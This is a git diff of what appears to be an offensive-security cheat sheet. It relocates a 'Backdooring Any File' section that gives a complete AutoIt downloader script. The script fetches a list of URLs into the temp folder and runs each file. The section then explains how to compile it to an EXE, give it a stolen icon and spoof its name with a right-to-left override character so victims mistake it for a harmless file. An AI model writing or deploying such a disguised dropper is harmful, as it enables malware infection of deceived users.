@@ -478,6 +478,38 @@ exe.pdf
 ```
 send it in zip or firefox will remove the right-to-left character
 
+## Backdooring Any File (Method 2)
+Download and execute anything and any number of files.  
+AutoIt Scripting: (AutoIt is not installed in kali but it install automaticli when install veil)
+```
+#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+
+Local $urls = "url1,url2,url3..."
+
+Local $urlsArray = StringSplit($urls, ",", 2 )
+
+For $url In $urlsArray
+	$sFile = _DownloadFile($url)
+	shellExecute($sFile)
+
+Next
+
+Func _DownloadFile($sURL)
+    Local $hDownload, $sFile
+    $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    $sDirectory = @TempDir & $sFile
+    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+    Return $sDirectory
+EndFunc   ;==>_GetURLImage
+```
+save whit .au3 extention
+use autoit compiler to convert to EXE
+select an icon form iconarchive.com or serch img to icon on google exampl http://rw-designer.com/image-to-icon
+spoof the name add right-to-left character
+
+
 ## Trojan Factory
 - https://github.com/z00z/TrojanFactory
 Installation:
@@ -726,37 +758,6 @@ Multi Handler
 ```
 use exploit/multi/handler
 ```
-
-## Backdooring Any File
-Download and execute anything and any number of files.  
-AutoIt Scripting: (AutoIt is not installed in kali but it install automaticli when install veil)
-```
-#include <StaticConstants.au3>
-#include <WindowsConstants.au3>
-
-Local $urls = "url1,url2,url3..."
-
-Local $urlsArray = StringSplit($urls, ",", 2 )
-
-For $url In $urlsArray
-	$sFile = _DownloadFile($url)
-	shellExecute($sFile)
-
-Next
-
-Func _DownloadFile($sURL)
-    Local $hDownload, $sFile
-    $sFile = StringRegExpReplace($sURL, "^.*/", "")
-    $sDirectory = @TempDir & $sFile
-    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
-    InetClose($hDownload)
-    Return $sDirectory
-EndFunc   ;==>_GetURLImage
-```
-save whit .au3 extention
-use autoit compiler to convert to EXE
-select an icon form iconarchive.com or serch img to icon on google exampl http://rw-designer.com/image-to-icon
-spoof the name add right-to-left character
 
 ## Gobuster
 https://github.com/OJ/gobuster
